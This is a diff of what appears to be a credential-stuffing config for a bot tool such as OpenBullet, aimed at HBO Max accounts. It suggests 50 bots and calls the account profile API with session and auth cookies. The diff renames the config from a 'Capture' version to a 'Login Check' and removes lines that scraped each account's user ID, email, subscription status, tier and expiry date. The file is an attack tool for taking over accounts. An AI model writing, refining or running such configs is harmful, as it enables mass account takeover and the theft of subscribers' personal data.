@@ -1,6 +1,6 @@
 [SETTINGS]
 {
-  "Name": "HBO Max + Capture",
+  "Name": "HBO Max Login Check",
   "SuggestedBots": 50,
   "MaxCPM": 0,
   "LastModified": "2025-08-18T01:56:56.0000000+00:00",
@@ -108,9 +108,3 @@ REQUEST GET "https://play.hbomax.com/api/account/profile"
   HEADER "Sec-Fetch-Mode: cors"
   HEADER "Sec-Fetch-Site: same-origin"
   COOKIE "hbomax_session=eyJpdiI6IjdmNzE4YzRhNzY5YjQwNzE4ZjE5YzE4YzE5YzE4YzE5IiwidmFsdWUiOiJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAiLCJtYWMiOiJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAifQ%3D%3D; _ga=GA1.2.123456789.1692337223; _gid=GA1.2.987654321.1694013559; _fbp=fb.1.1692337223.123456789; _gcl_au=1.1.123456789.1692337223; _tt_enable_cookie=1; _ttp=abcdef123456789; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Aug+18+2025+01%3A53%3A07+GMT&version=202308.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1; hbomax_cart_id=cart_123456789; hbomax_user_id=user_123456789; hbomax_auth_token=auth_token_123456789"
-
-PARSE "<SOURCE>" LR "\"user_id\":" "," -> CAP "User ID: " "[" "]"
-PARSE "<SOURCE>" LR "\"email\":" "," -> CAP "Email: " "[" "]"
-PARSE "<SOURCE>" LR "\"subscription_status\":" "," -> CAP "Subscription Status: " "[" "]"
-PARSE "<SOURCE>" LR "\"subscription_tier\":" "," -> CAP "Subscription Tier: " "[" "]"
-PARSE "<SOURCE>" LR "\"expiry_date\":" "," -> CAP "Expiry Date: " "[" "]"
